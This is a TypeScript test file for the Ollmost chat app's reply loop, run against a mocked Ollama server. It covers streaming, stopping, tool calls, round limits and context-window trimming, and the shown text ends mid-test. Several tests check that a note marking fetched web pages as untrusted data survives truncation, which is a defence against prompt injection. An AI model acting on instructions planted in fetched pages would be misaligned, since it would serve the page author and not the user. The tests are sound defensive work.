import { realpathSync, writeFileSync } from 'node:fs'
import type { ServerResponse } from 'node:http'
import { join } from 'node:path'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChatEvent, MessageStats, Settings, ThinkSetting, ToolEvent } from '@shared/types'
import type { RoundsInput } from '../src/main/chat/rounds'
import type { ChatEvent as ProviderEvent, ChatRequest, Provider } from '../src/main/providers/types'
import type { ToolContext, ToolProvider } from '../src/main/chat/tools'
import type { Workspace } from '../src/main/runner/workspace'
import { toModelKey } from '@shared/modelKey'
import { completionJson, type Dialect, line, type MockOllama, startMockOllama, streamChunks, type Turn, writeTurn } from './ollamaMock'
import { tempDir } from './tempDir'

// Everything above the Electron line is real: SQLite (in memory), settings, prompt assembly, the
// Ollama client and the tool loop. Only Electron itself is faked, and Ollama is a local mock server.
const events = vi.hoisted(() => {
  process.env.OLLMOST_WEB_URL = 'http://127.0.0.1:1' // replaced once the mock is listening
  return [] as ChatEvent[]
})
vi.mock('electron', () => ({
  BrowserWindow: { getAllWindows: () => [{ webContents: { send: (_channel: string, e: ChatEvent) => events.push(e) } }] },
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from(s),
    decryptString: (b: Buffer) => b.toString()
  },
  shell: {},
  app: { getPath: () => '' },
  nativeImage: {}
}))
// The @ references' reader (#129), as it is unless a test stands in for it: to hold a read, fail one, or count them.
type ResolveReferences = typeof import('../src/main/code/references').resolveReferences
const referenceReader = vi.hoisted(() => ({ real: null as unknown as ResolveReferences, stand: null as ResolveReferences | null }))
vi.mock('../src/main/code/references', async (importOriginal) => {
  const real = await importOriginal<typeof import('../src/main/code/references')>()
  referenceReader.real = real.resolveReferences
  return {
    ...real,
    resolveReferences: (...args: Parameters<ResolveReferences>) => (referenceReader.stand ?? real.resolveReferences)(...args)
  }
})

// web.ts reads its base URL at import, so the mock must be listening before the service loads.
const ollama: MockOllama = await startMockOllama()
// An OpenAI-compatible server, added below as a second endpoint: the reply loop must save the same over either.
const openaiServer: MockOllama = await startMockOllama()
process.env.OLLMOST_WEB_URL = ollama.url

const { all, openDatabase, run } = await import('../src/main/db/index')
const { updateSettings, setApiKey, setEndpoints, getSettings } = await import('../src/main/settings')
const service = await import('../src/main/chat/service')
const { getTrace, listTraces } = await import('../src/main/debug/traces')
const {
  deleteConversation,
  getConversation,
  getMessage,
  insertAttachment,
  insertMessage,
  createConversation,
  search,
  updateConversation,
  updateMessage
} = await import('../src/main/db/conversations')
const { registerToolProvider } = await import('../src/main/chat/tools')
const { addEndpoint, setEndpointKey } = await import('../src/main/providers/endpoints')
const { runRounds } = await import('../src/main/chat/rounds')
const { EndpointGoneError, invalidateProviders, modelInfo, resolve } = await import('../src/main/providers/registry')
const { replayRequest } = await import('../src/main/debug/replay')
const { conversationUsage, insertUsageEvent } = await import('../src/main/db/usage')
const { readModelProfile, writeModelOverrides } = await import('../src/main/db/kv')
const approvals = await import('../src/main/chat/approvals')
const mcpConfig = await import('../src/main/mcp/config')
const mcpManager = await import('../src/main/mcp/manager')
const { paths } = await import('../src/main/paths')
paths.data = tempDir('ollmost-service-data-')

type ChatHandler = (body: Record<string, unknown>, res: ServerResponse, call: number) => unknown
let chat: ChatHandler
let web: (path: string, res: ServerResponse) => unknown
let chatCalls: Array<Record<string, unknown>>
let titleCalls: Array<Record<string, unknown>>

beforeAll(() => {
  openDatabase(':memory:')
  // The one Ollama endpoint, pointed at the mock.
  setEndpoints([
    {
      id: 'ollama',
      name: 'Ollama',
      kind: 'ollama',
      flavor: 'ollama',
      baseUrl: ollama.url,
      enabled: true,
      showCloudCatalog: true,
      numCtx: 32768
    }
  ])
  invalidateProviders()
  updateSettings({ skills: { autoLoad: false }, web: { enabled: true } })
  ollama.handler = (req, res) => {
    if (req.url === '/api/show')
      return res.writeHead(200).end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 8192 } }))
    // Titles are generated in the background after a reply; answer them apart from the scripted chat.
    if (req.url === '/api/chat' && req.json.stream === false) {
      titleCalls.push(req.json)
      return res.writeHead(200).end(JSON.stringify({ message: { role: 'assistant', content: 'A title' }, done: true }))
    }
    if (req.url === '/api/chat') {
      chatCalls.push(req.json)
      return chat(req.json, res, chatCalls.length)
    }
    return web(req.url ?? '', res)
  }
})
afterAll(() => ollama.close())
beforeEach(() => {
  events.length = 0
  chatCalls = []
  titleCalls = []
  setApiKey(null)
  web = (_p, res) => res.writeHead(404).end()
})

const reply =
  (text: string): ChatHandler =>
  (_b, res) =>
    streamChunks(res, [
      line({ message: { role: 'assistant', content: text }, done: false }),
      line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
    ]).then(() => res.end())

const toolCall = (name: string, args: Record<string, unknown>) =>
  line({ message: { role: 'assistant', content: '', tool_calls: [{ function: { name, arguments: args } }] }, done: false }) +
  line({ done: true })

/** A send() body for a follow-up in an existing chat. */
const sendBody = (conversationId: string) => ({
  conversationId,
  projectId: null,
  content: '',
  attachmentIds: [],
  model: 'ollama/llama3.2',
  think: null,
  skills: [],
  toolSources: []
})

function start(content = 'hello') {
  return service.send({
    conversationId: null,
    projectId: null,
    content,
    attachmentIds: [],
    model: 'ollama/llama3.2',
    think: null,
    skills: [],
    toolSources: []
  })
}

function waitFor<T>(check: () => T | undefined | false, ms = 5000): Promise<T> {
  return new Promise((resolve, reject) => {
    const t0 = Date.now()
    const tick = () => {
      const v = check()
      if (v) return resolve(v)
      if (Date.now() - t0 > ms) return reject(new Error('timed out waiting'))
      setTimeout(tick, 10)
    }
    tick()
  })
}

const doneEvent = (conversationId: string) =>
  waitFor(() => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === conversationId))

describe('reply loop', () => {
  it('streams a reply and saves it with stats', async () => {
    chat = reply('Hi there')
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Hi there')
    expect(done.message.stats).toMatchObject({ promptTokens: 10, completionTokens: 3, doneReason: 'stop' })
    expect(chatCalls[0]).toMatchObject({ model: 'llama3.2', options: { num_ctx: 8192 } })
    // The title request uses the same num_ctx, so Ollama doesn't reload the local model for it.
    await waitFor(() => titleCalls.length > 0)
    expect(titleCalls[0]).toMatchObject({ options: { num_ctx: 8192 } })
  })

  it('records when a reply was cut off by the length limit', async () => {
    chat = (_b, res) =>
      streamChunks(res, [
        line({ message: { role: 'assistant', content: 'The list goes on: one, two, thr' }, done: false }),
        line({ done: true, done_reason: 'length', eval_count: 4096 })
      ]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.doneReason).toBe('length')
    expect(done.message.error).toBeNull()
  })

  it("sends a chat's own instructions with its replies", async () => {
    chat = reply('Arr.')
    const r = start()
    await doneEvent(r.conversation.id)
    updateConversation(r.conversation.id, { instructions: 'Answer like a pirate.' })
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'hi again',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const system = (chatCalls.at(-1)!.messages as Array<{ role: string; content: string }>)[0]
    expect(system.content).toContain('Answer like a pirate.')
  })

  it('saves a failed stream with its partial text and an error', async () => {
    chat = (_b, res) =>
      streamChunks(res, [line({ message: { role: 'assistant', content: 'Half an ans' }, done: false })]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Half an ans')
    expect(done.message.error).toMatch(/dropped before the reply finished/)
  })

  it('checkpoints a long reply to the database while it streams', async () => {
    let release!: () => void
    const gate = new Promise<void>((r) => (release = r))
    chat = async (_b, res) => {
      await streamChunks(res, [
        line({ message: { role: 'assistant', content: '', thinking: 'early thought' }, done: false }),
        line({ message: { role: 'assistant', content: 'early words' }, done: false })
      ])
      await new Promise((r) => setTimeout(r, 1700))
      res.write(line({ message: { role: 'assistant', content: '!' }, done: false })) // triggers the checkpoint
      await gate
      res.end(line({ done: true }))
    }
    const r = start()
    const saved = await waitFor(() => getMessage(r.assistantMessageId)?.content === 'early words!')
    expect(saved).toBe(true)
    // The checkpoint carries the round's thinking so far, placed, in case it's the last save.
    expect(getMessage(r.assistantMessageId)?.thinkingSegments).toEqual([{ text: 'early thought', at: 0, index: 0, ms: expect.any(Number) }])
    release()
    await doneEvent(r.conversation.id)
  })

  it('stop() resolves only after the partial reply is saved', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })]) // then hangs
    const r = start('stop me for a delete')
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true }) // as deleting the chat does
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.content).toBe('partial')
    expect(saved.error).toBeNull()
    expect(saved.stats).not.toBeNull()
    // The chat can now be deleted without the reply writing to it afterwards.
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    // A stop for a delete (or a quit) doesn't start a title request (an earlier test's title request may still arrive here).
    await new Promise((r) => setTimeout(r, 50))
    expect(titleCalls.some((t) => JSON.stringify(t.messages).includes('stop me for a delete'))).toBe(false)
  })

  it('stop() keeps the thinking of the round it stopped in', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: '', thinking: 'half a thought' }, done: false })]) // then hangs
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.thinking).toBe('half a thought')
    expect(saved.thinkingSegments).toEqual([{ text: 'half a thought', at: 0, index: 0, ms: expect.any(Number) }])
  })

  it('still titles a new chat whose first reply was stopped with Stop', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })])
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    expect(titleCalls).toHaveLength(1)
  })

  it('keeps an overlapping reply stoppable after the earlier one finishes', async () => {
    chat = reply('first')
    const r = start()
    await doneEvent(r.conversation.id)
    events.length = 0
    // regenerate() awaits file cleanup before registering its reply; a send() landing in that gap
    // registers its own reply first. The regenerated reply streams and then hangs.
    chat = (_b, res, n) =>
      n === 2
        ? reply('sent reply')(_b, res, n)
        : streamChunks(res, [line({ message: { role: 'assistant', content: 'regenerated' }, done: false })])
    const regen = service.regenerate(r.conversation.id, { model: 'ollama/llama3.2', think: null })
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'again',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const second = await regen
    await doneEvent(r.conversation.id) // the send's reply finished
    expect(service.isReplying()).toBe(true) // the regenerated reply is still tracked…
    await service.stop(r.conversation.id) // …so stop() waits for it and it gets saved
    expect(getMessage(second.assistantMessageId)?.stats).not.toBeNull()
    expect(service.isReplying()).toBe(false)
  })

  it('stops promptly during a slow web request and marks the call stopped', async () => {
    setApiKey('test-key')
    chat = (_b, res) => void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://example.com' }))
    web = () => undefined // web_fetch never answers
    const r = start('read example.com')
    await waitFor(() => events.some((e) => e.type === 'tool' && e.event.pending))
    const t0 = Date.now()
    await service.stop(r.conversation.id)
    expect(Date.now() - t0).toBeLessThan(1000)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.toolEvents).toEqual([expect.objectContaining({ tool: 'web_fetch', pending: false, ok: false })])
    expect(saved.error).toBeNull()
    // The debugger shows the cancelled call as stopped, not forever running.
    const traces = listTraces(r.conversation.id)
    expect(traces.find((t) => t.kind === 'tool')?.status).toBe('aborted')
    expect(traces.every((t) => t.status !== 'running')).toBe(true)
  })

  it('withdraws tools after the model only calls tools Ollmost lacks', async () => {
    chat = (_b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('python', { code: '1+1' })) : reply('2')(_b, res, n))
    const r = start('what is 1+1')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('2')
    expect(chatCalls).toHaveLength(2)
    expect(chatCalls[1].tools).toBeUndefined()
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'python', ok: false, unknown: true })
  })

  it('records where in the reply each tool call happened, with a preview of its result', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Let me check.\n\nFound it.')
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'web_search', ok: true, at: 'Let me check.'.length })
    expect(event.preview).toContain('https://k.io')
    expect(event.unknown).toBeUndefined()
    // The live events carry the position too, while pending and once finished.
    const live = events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id
    )
    expect(live.map((e) => [e.event.pending ?? false, e.event.at])).toEqual([
      [true, 13],
      [false, 13]
    ])
  })

  it('lets a running tool replace its pending event, and tells it its index', async () => {
    const seen: number[] = []
    const slow: ToolProvider = {
      id: 'slow-test',
      tools: () => [{ type: 'function', function: { name: 'slow', description: 'slow', parameters: { type: 'object', properties: {} } } }],
      pending: () => ({ tool: 'slow', args: {}, ok: true, pending: true, summary: 'starting' }),
      approval: () => 'auto',
      run: async (_call, ctx) => {
        seen.push(ctx.callIndex!)
        ctx.progress?.({ tool: 'slow', args: {}, ok: true, summary: 'halfway' })
        return { content: 'slow done', event: { tool: 'slow', args: {}, ok: true, summary: 'finished' } }
      }
    }
    const off = registerToolProvider(slow)
    try {
      chat = (_b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('slow', {})) : reply('ok')(_b, res, n))
      const r = start('go slow')
      const done = await doneEvent(r.conversation.id)
      expect(seen).toEqual([0])
      const live = events.filter(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id
      )
      expect(live.map((e) => [e.event.summary, e.event.pending ?? false])).toEqual([
        ['starting', true],
        ['halfway', true],
        ['finished', false]
      ])
      expect(done.message.toolEvents[0]).toMatchObject({ summary: 'finished', at: 0 })
    } finally {
      off()
    }
  })

  it('ignores a report from a tool whose call has already finished', async () => {
    let late: ((event: ToolEvent) => void) | undefined
    const quick: ToolProvider = {
      id: 'late-test',
      tools: () => [
        { type: 'function', function: { name: 'quick', description: 'quick', parameters: { type: 'object', properties: {} } } }
      ],
      pending: () => ({ tool: 'quick', args: {}, ok: true, pending: true, summary: 'starting' }),
      approval: () => 'auto',
      run: async (_call, ctx) => {
        late = ctx.progress
        return { content: 'quick done', event: { tool: 'quick', args: {}, ok: true, summary: 'finished' } }
      }
    }
    const off = registerToolProvider(quick)
    try {
      chat = (b, res, n) => {
        if (n === 1) return void res.writeHead(200).end(toolCall('quick', {}))
        // The call finished before this request was made: a report now comes too late to count.
        late?.({ tool: 'quick', args: {}, ok: true, summary: 'too late' })
        return reply('ok')(b, res, n)
      }
      const r = start('go quick')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0]).toMatchObject({ tool: 'quick', ok: true, summary: 'finished' })
      expect(events.some((e) => e.type === 'tool' && e.conversationId === r.conversation.id && e.event.summary === 'too late')).toBe(false)
    } finally {
      off()
    }
  })

  it('keeps each round’s thinking with where the round began, live and saved', async () => {
    setApiKey('test-key')
    const thought = (text: string) => line({ message: { role: 'assistant', content: '', thinking: text }, done: false })
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              thought('Plan: search.') +
                line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) +
                toolCall('web_search', { query: 'ollmost' })
            )
        : n === 2
          ? void res
              .writeHead(200)
              .end(
                thought('Got it.') +
                  line({ message: { role: 'assistant', content: 'Found it.' }, done: false }) +
                  line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
              )
          : reply('Search chat')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    // The joined text stays as it was, for older readers; the segments say where each round's thinking belongs.
    expect(done.message.thinking).toBe('Plan: search.Got it.')
    expect(done.message.thinkingSegments).toEqual([
      { text: 'Plan: search.', at: 0, index: 0, ms: expect.any(Number) },
      { text: 'Got it.', at: 'Let me check.'.length, index: 1, ms: expect.any(Number) }
    ])
    const thinkingDeltas = events.filter(
      (e): e is Extract<ChatEvent, { type: 'delta' }> => e.type === 'delta' && e.conversationId === r.conversation.id && !!e.thinking
    )
    expect(thinkingDeltas.map((e) => [e.thinking, e.round])).toEqual([
      ['Plan: search.', { at: 0, index: 0 }],
      ['Got it.', { at: 13, index: 1 }]
    ])
    const { listMessages } = await import('../src/main/db/conversations')
    expect(listMessages(r.conversation.id).at(-1)?.thinkingSegments).toEqual(done.message.thinkingSegments)
  })

  it('reports the chat’s usage as each round ends, so the chip moves during a long reply', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    const mine = events.filter((e) => e.conversationId === r.conversation.id)
    const types = mine.map((e) => e.type)
    // One usage event as the first round closes, after its text and before the second round's (the done carries the
    // last round's), then one after the title request.
    const before = types.slice(0, types.indexOf('done'))
    expect(before.filter((x) => x === 'usage')).toHaveLength(1)
    expect(before.indexOf('usage')).toBeGreaterThan(before.indexOf('delta'))
    expect(before.lastIndexOf('delta')).toBeGreaterThan(before.indexOf('usage'))
    const between = mine[types.indexOf('usage')] as Extract<ChatEvent, { type: 'usage' }>
    expect(between.usage.byModel.map((m) => m.requests)).toEqual([1])
    expect(done.usage.byModel.map((m) => m.requests)).toEqual([2])
    const after = mine.slice(types.indexOf('done')).filter((e): e is Extract<ChatEvent, { type: 'usage' }> => e.type === 'usage')
    expect(after.map((e) => e.usage.byModel.map((m) => m.requests))).toEqual([[3]])
  })

  it('remembers earlier search results on the next turn', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost news' }))
        : reply(n === 2 ? 'Two stories today.' : 'Opening it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          results: [
            { title: 'Ollmosts are back', url: 'https://a.example/ollmosts', content: 'x' },
            { title: 'Pottery prices', url: 'https://b.example/pots', content: 'y' }
          ]
        })
      )
    const r = start('what is in the news?')
    const first = await doneEvent(r.conversation.id)
    expect(first.message.toolEvents[0].record).toContain('2. Pottery prices — https://b.example/pots')
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'open the second one',
      attachmentIds: [],
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const followUp = chatCalls[2].messages as Array<{ role: string; content: string; tool_calls?: unknown[] }>
    const replayed = followUp.find((m) => m.role === 'tool')
    expect(replayed?.content).toContain('https://b.example/pots')
    expect(followUp.find((m) => m.tool_calls)?.tool_calls).toEqual([
      { function: { name: 'web_search', arguments: { query: 'ollmost news' } } }
    ])
  })

  it('ends a tool-happy model with a tool-free final round', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Final answer')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 't', url: 'https://t.io', content: 'c' }] }))
    const r = start('research this')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Final answer')
    expect(chatCalls.length).toBe(20)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    // It was still calling tools, so the reply says it ran out of rounds (and offers Continue).
    expect(done.message.stats?.toolRoundLimit).toBe(20)
  })

  it('takes the round limit from the reply options', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Stopped early')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
    const r = service.send(
      {
        conversationId: null,
        projectId: null,
        content: 'dig deep',
        attachmentIds: [],
        model: 'ollama/llama3.2',
        think: null,
        skills: [],
        toolSources: []
      },
      { maxToolRounds: 3 }
    )
    const done = await doneEvent(r.conversation.id)
    expect(chatCalls.length).toBe(3)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    expect(done.message.stats?.toolRoundLimit).toBe(3)
  })

  describe('context guard within a turn', () => {
    // The mock model has an 8,192-token window: requests may use 6,144 tokens (about 24K characters).
    const fetchRound = (b: Record<string, unknown>, res: ServerResponse, n: number, promptCount = 100) =>
      n <= 2
        ? void res.writeHead(200).end(
            line({
              message: {
                role: 'assistant',
                content: '',
                tool_calls: [{ function: { name: 'web_fetch', arguments: { url: `https://p${n}.io` } } }]
              },
              done: false
            }) + line({ done: true, prompt_eval_count: promptCount })
          )
        : reply('Compared.')(b, res, n)
    const toolMessages = (call: Record<string, unknown>) =>
      (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    let page = 0
    const pages = (size: number) => (_p: string, res: ServerResponse) =>
      res.writeHead(200).end(JSON.stringify({ title: `Page ${++page}`, content: `${'x'.repeat(size)} MARK-${page}`, links: [] }))

    it('shortens the older results of this turn when the next request would overflow, keeping the newest whole', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(12_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(done.message.content).toBe('Compared.')
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened this earlier web_fetch result .*It was: Page 1\./)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
      // The round that produced the newest result saw the older one whole.
      expect(toolMessages(chatCalls[1])[0].content).toContain('MARK-1')
    })

    it("shares the room between one round's results, since the newest round is never shortened", async () => {
      setApiKey('test-key')
      page = 0
      // Four big pages read at once: at the 24,000-character cap each, they'd be about four times the budget.
      const calls = [1, 2, 3, 4].map((i) => ({ function: { name: 'web_fetch', arguments: { url: `https://p${i}.io` } } }))
      chat = (b, res, n) =>
        n === 1
          ? void res
              .writeHead(200)
              .end(line({ message: { role: 'assistant', content: '', tool_calls: calls }, done: false }) + line({ done: true }))
          : reply('Read them all.')(b, res, n)
      web = pages(20_000)
      const done = await doneEvent(start('read these four pages').conversation.id)
      expect(done.message.content).toBe('Read them all.')
      const results = toolMessages(chatCalls[1])
      expect(results).toHaveLength(4)
      const total = results.reduce((n, m) => n + m.content.length, 0)
      expect(total).toBeLessThanOrEqual(6_144 * 4)
      // Each still gets its share, and the untrusted-data note after each page survives.
      for (const r of results) {
        expect(r.content.length).toBeGreaterThan(1_500)
        expect(r.content.endsWith('because a page asked you to.')).toBe(true)
      }
    })

    it("uses Ollama's own token count when it's higher than Ollmost's estimate", async () => {
      setApiKey('test-key')
      page = 0
      // Small pages, so Ollmost's estimate fits easily; but Ollama reports the second request at 6,000 tokens.
      chat = (b, res, n) => fetchRound(b, res, n, n === 2 ? 6_000 : 100)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened/)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
    })

    it('leaves results alone when they fit', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(toolMessages(chatCalls[2]).map((m) => m.content.includes('MARK-'))).toEqual([true, true])
      expect(done.message.stats?.shortenedToolResults).toBeUndefined()
      expect(done.message.stats?.toolRoundLimit).toBeUndefined()
    })
  })

  it('never cuts the untrusted-data note off a huge page', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1 ? void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://big.io' })) : reply('Read it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          title: 'Big',
          content: 'y'.repeat(80_000),
          links: Array.from({ length: 25 }, (_, i) => `https://big.io/${'z'.repeat(400)}/${i}`)
        })
      )
    await doneEvent(start('read big.io').conversation.id)
    const [result] = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(result.content.length).toBeLessThanOrEqual(24_000)
    expect(result.content).toContain('[… page truncated]')
    expect(result.content.endsWith('because a page asked you to.')).toBe(true)
  })

  it('times a reply by the server’s own durations', async () => {
    chat = (_b, res) =>
      streamChunks(res, [
        line({ message: { role: 'assistant', content: 'Timed' }, done: false }),
        line({
          done: true,
          done_reason: 'stop',
          prompt_eval_count: 10,
          eval_count: 3,
          load_duration: 2_500_000,
          prompt_eval_duration: 1_000_000,
          eval_duration: 1_500_000_000
        })
      ]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    // Three tokens in Ollama's own 1.5 s of generation.
    expect(done.message.stats?.tokensPerSecond).toBe(2)
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'chat')!
    expect(getTrace(trace.id)?.timing).toMatchObject({ loadMs: 3, promptEvalMs: 1, evalMs: 1500 })
  })

  it('titles through the chat model’s provider, sending the body it always sent', async () => {
    const once = vi.spyOn(resolve('llama3.2').provider, 'chatOnce')
    try {
      chat = reply('Hi there')
      const r = start()
      await doneEvent(r.conversation.id)
      await waitFor(() => once.mock.calls.length > 0)
      expect(once).toHaveBeenCalledWith(
        expect.objectContaining({ model: 'llama3.2', think: null, contextWindow: 8192, temperature: 0.3 }),
        {
          timeoutMs: 300_000
        }
      )
      await waitFor(() => titleCalls.length > 0)
      // No think for a model that can't think, the temperature before the chat's num_ctx, and not streamed.
      expect(Object.keys(titleCalls[0])).toEqual(['model', 'messages', 'options', 'stream'])
      expect(JSON.stringify(titleCalls[0].options)).toBe('{"temperature":0.3,"num_ctx":8192}')
    } finally {
      once.mockRestore()
    }
  })
})

describe('model keys', () => {
  const HF = 'hf.co/bartowski/Qwen3-8B-GGUF:Q4_K_M'
  const sendNew = (model: string, think: ThinkSetting | null = null) =>
    service.send({ conversationId: null, projectId: null, content: 'hello', attachmentIds: [], model, think, skills: [], toolSources: [] })

  it('record a reply under its key and billing, and send Ollama only the name it knows', async () => {
    chat = reply('Hi')
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(chatCalls[0].model).toBe('llama3.2')
    expect(done.message).toMatchObject({ model: 'ollama/llama3.2', stats: { billing: 'local' } })
    expect(
      all<{ model: string; billing: string }>(
        "SELECT model, billing FROM usage_events WHERE conversation_id = ? AND kind = 'chat'",
        r.conversation.id
      )
    ).toEqual([{ model: 'ollama/llama3.2', billing: 'local' }])
    expect(listTraces(r.conversation.id).find((t) => t.kind === 'chat')?.model).toBe('ollama/llama3.2')
  })

  it('send an hf.co model its whole name (Review Focus #1)', async () => {
    chat = reply('Hi')
    const r = sendNew(`ollama/${HF}`)
    await doneEvent(r.conversation.id)
    expect(r.conversation.model).toBe(`ollama/${HF}`)
    expect(chatCalls[0].model).toBe(HF)
  })

  it('read a model’s thinking profile and prompt by its own name, not its key', async () => {
    const base = ollama.handler
    ollama.handler = (req, res) =>
      req.url === '/api/show' && req.json.model === 'gpt-oss:20b'
        ? void res.writeHead(200).end(JSON.stringify({ capabilities: ['completion', 'tools', 'thinking'], model_info: {} }))
        : base(req, res)
    try {
      chat = reply('Hi')
      const r = sendNew('ollama/gpt-oss:20b', 'high')
      await doneEvent(r.conversation.id)
      // gpt-oss takes effort levels. Read by its key, it would have been an on/off model and sent think: true.
      expect(chatCalls[0].think).toBe('high')
      expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toContain('You are the model "gpt-oss:20b"')
    } finally {
      ollama.handler = base
    }
  })
})

describe('the title model', () => {
  afterEach(() => {
    updateSettings({ titleModel: null })
    setEndpoints(getSettings().endpoints.filter((e) => e.id !== 'off'))
    invalidateProviders()
  })

  // A title from the test before can land after beforeEach empties titleCalls, so each chat's title is found by its
  // first message.
  const titleOf = (content: string) => waitFor(() => titleCalls.find((t) => JSON.stringify(t.messages).includes(content)))

  it('titles with the model set in Settings', async () => {
    updateSettings({ titleModel: 'ollama/tiny-title' })
    chat = reply('Hi')
    start('title me with tiny-title')
    expect((await titleOf('title me with tiny-title')).model).toBe('tiny-title')
  })

  it('falls back to the chat’s model when the title model’s endpoint is gone or turned off', async () => {
    setEndpoints([
      ...getSettings().endpoints,
      { id: 'off', name: 'Off box', kind: 'ollama', flavor: 'ollama', baseUrl: 'http://10.0.0.9:11434', enabled: false }
    ])
    invalidateProviders()
